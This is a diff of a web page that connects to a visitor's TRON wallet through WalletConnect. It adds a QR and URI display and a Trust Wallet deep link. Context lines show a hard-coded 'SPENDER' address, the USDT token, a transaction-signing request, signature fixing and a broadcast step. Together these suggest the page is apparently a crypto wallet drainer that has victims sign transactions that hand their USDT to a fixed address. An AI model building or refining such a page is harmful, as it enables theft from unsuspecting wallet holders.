@@ -12,7 +12,8 @@ body{font-family:sans-serif;background:#0a0a0a;color:#fff;text-align:center;padd
 .done{border-color:#22c55e}
 .error{border-color:#ef4444}
 #qr{margin-top:20px}
-pre{font-size:12px;color:#aaa}
+#uriBox{margin-top:15px;font-size:11px;background:#111;padding:10px;border-radius:8px;word-break:break-all}
+a{color:#4da3ff}
 </style>
 </head>
 
@@ -27,6 +28,14 @@ pre{font-size:12px;color:#aaa}
 <div id="s5" class="step">Broadcast</div>
 
 <div id="qr"></div>
+
+<div id="uriBox">
+  <div><b>WalletConnect URI:</b></div>
+  <div id="wcUri">Waiting...</div>
+  <br>
+  <a id="twLink" target="_blank">Open in Trust Wallet</a>
+</div>
+
 <pre id="log"></pre>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -35,9 +44,7 @@ pre{font-size:12px;color:#aaa}
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
 
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
-
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const TRONGRID = "https://api.trongrid.io";
 
@@ -51,13 +58,14 @@ function log(msg){
   document.getElementById("log").textContent += "\n" + msg;
 }
 
-// ✅ safe address conversion
+// safe address conversion
 async function toHex(addr){
   const res = await fetch(TRONGRID + "/wallet/validateaddress",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({address:addr})
   });
+
   const data = await res.json();
 
   if(!data.result){
@@ -120,29 +128,46 @@ function fixSig(resp, tx){
   return tx;
 }
 
-// 🔄 AUTO QR CONNECT LOOP
+// show QR + fallback
+function showQR(uri){
+  document.getElementById("qr").innerHTML = "";
+
+  // QR render
+  try {
+    new QRCode(document.getElementById("qr"), {
+      text: uri,
+      width:200,
+      height:200
+    });
+  } catch(e){
+    log("QR render failed");
+  }
+
+  // show URI
+  document.getElementById("wcUri").textContent = uri;
+
+  // Trust Wallet link
+  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+  document.getElementById("twLink").href = link;
+}
+
+// auto reconnect loop
 async function connectLoop(){
   while(true){
     try{
-      await client.disconnectAll(); // clear old sessions
+      await client.disconnectAll();
 
       const { uri, approval } = await client.connect({
         requiredNamespaces:{
           tron:{
-            methods:["tron_signTransaction"], // KEEP YOUR WORKING METHOD
+            methods:["tron_signTransaction"],
             chains:[TRON_CHAIN],
             events:[]
           }
         }
       });
 
-      document.getElementById("qr").innerHTML = "";
-
-      new QRCode(document.getElementById("qr"), {
-        text: uri,
-        width:200,
-        height:200
-      });
+      showQR(uri);
 
       session = await approval();
       return;
@@ -153,7 +178,7 @@ async function connectLoop(){
   }
 }
 
-// MAIN
+// main
 async function main(){
   try{
     step("s1","active");
